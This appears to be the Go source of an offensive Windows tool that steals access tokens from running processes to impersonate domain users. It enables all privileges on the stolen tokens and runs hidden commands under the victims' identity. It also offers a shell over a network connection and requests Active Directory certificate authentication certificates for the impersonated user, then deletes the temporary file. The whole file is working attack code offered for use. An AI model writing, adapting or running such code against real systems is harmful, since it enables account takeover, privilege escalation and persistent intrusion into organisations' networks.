package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"bufio"
	"bytes"
	"github.com/fourcorelabs/wintoken"
	ps "github.com/mitchellh/go-ps"
	"github.com/Serizao/impergonate/communication"
	"github.com/Serizao/impergonate/elevate"
	"github.com/Serizao/impergonate/adcs"
	"unicode/utf8"

)






func main() {

	list := flag.Bool("list", false, "List available token")
	username := flag.String("u", "", "Username")
	domain := flag.String("d", "", "Domain")
	command := flag.String("c", "cmd.exe", "Commande to exec")
	generateCertificate := flag.Bool("generate-cert", false, "Generate user certificate must use with ca-config")
	caConfig := flag.String("ca-config", "", "Config of root CA must be defined if generate-cert option is enbaled")
	shell := flag.Bool("shell", false, "Get a shell ")
	flag.Parse()

	privOk := elevate.CheckPriv()

	if privOk {
		token, err := wintoken.OpenProcessToken(0, wintoken.TokenPrimary)
		if err != nil {
			panic(err)
		}
		defer token.Close()
		//Enable, Disable, or Remove privileges in one line
		token.EnableAllPrivileges()
		if *list {
			listToken()
			os.Exit(0)
		} else if *username == "" || *domain == "" {
			fmt.Println("To use token you must have username & domain")
			os.Exit(1)
		} else {
			if *generateCertificate && *caConfig!="" {
				rawCmd:=adcs.InfFile(*caConfig,*username)
				command:=adcs.FinalCommand(rawCmd)
				useToken(*domain, *username, command, *shell, false)
				FileB64Cert, err := os.Open( os.Getenv("windir")+"\\Temp\\cert-auth"+(*username)+".b64")

			    if err != nil {
			    	fmt.Print("[-] Unable to obtain Cert")
			    } else {
			    	
			    	fmt.Print("[+] cert b64 :\n\n")
			    	scanner := bufio.NewScanner(FileB64Cert)
					for scanner.Scan() {
						a :=bytes.Replace([]byte(scanner.Text()), []byte("\x00"), []byte(""), -1)
						a =bytes.Replace(a, []byte("\xff"), []byte(""), -1)
						a =bytes.Replace(a, []byte("\xfe"), []byte(""), -1)
				        fmt.Println(string(a))
				    }
				    FileB64Cert.Close()
			    	e := os.Remove( os.Getenv("windir")+"\\Temp\\cert-auth"+(*username)+".b64")
				    if e != nil {
				        fmt.Print("[-] Unable to delete temp file :",e)
				    }
			    }
			    os.Exit(0)
			} else if *username != "" && *domain != "" {
				useToken(*domain, *username, *command, *shell,true)
				os.Exit(0)
			}	
		} 
	} 
}
func trimTwoRune(s string) string {
    _, i := utf8.DecodeRuneInString(s)
    s=s[(i+1):]
    tempString:=""
    for _,data := range s {
    	if data != 0x00 {
			tempString=tempString+string(data)
    	}
    }
    return tempString
}
func listToken() {
	processes, _ := ps.Processes()
	var tokenList []wintoken.TokenUserDetail
	for _, process := range processes {
		token, err := wintoken.OpenProcessToken(process.Pid(), wintoken.TokenPrimary) //pass 0 for own process
		if err == nil {
			token.EnableAllPrivileges()
			t, _ := token.UserDetails()
			tokenList = appendIfNotExist(t, tokenList)
		}
	}
	fmt.Println("[+] User list to impersonnate:\n")
	for _, i := range tokenList {
		fmt.Println(i)
	}
}


func useToken(domain string, username string, cmdline string, shell bool,exit bool) {
	processes, _ := ps.Processes()
	for _, process := range processes {
		token, err := wintoken.OpenProcessToken(process.Pid(), wintoken.TokenPrimary) //pass 0 for own process
		if err == nil {
			t, _ := token.UserDetails()
			if t.Domain == domain && t.Username == username {
				token.EnableAllPrivileges()
				fmt.Println("[+] found process with same domain and username try to lauch process with it")
				if shell {

					go communication.Listen()
					time.Sleep(2 * time.Second)

		

						conn,_ := communication.Connect()
						cmd := exec.Command("cmd.exe", "/c", cmdline+"\n\n")
						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true,Token: syscall.Token(token.Token())}
						cmd.Stdin = conn
						cmd.Stdout = conn
						cmd.Stderr = conn
						if err := cmd.Run(); err != nil {
							fmt.Println("Error: ", err)
						} 
						fmt.Println("[+] Quit impersonate context")
			
					return
				} else {
					cmd := exec.Command("cmd.exe", "/c", cmdline+"\n\n")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true,Token: syscall.Token(token.Token())}
					if err := cmd.Run(); err != nil {
						fmt.Println("Error: ", err)
					} else {
						if exit {
							os.Exit(0)
						} else {
							return
						}
					}
				}
			}
		}
	}
}

func appendIfNotExist(token wintoken.TokenUserDetail, list []wintoken.TokenUserDetail) []wintoken.TokenUserDetail {
	for _, l := range list {
		if l.Domain == token.Domain && l.Username == token.Username {
			return list
		}
	}
	return append(list, token)
}


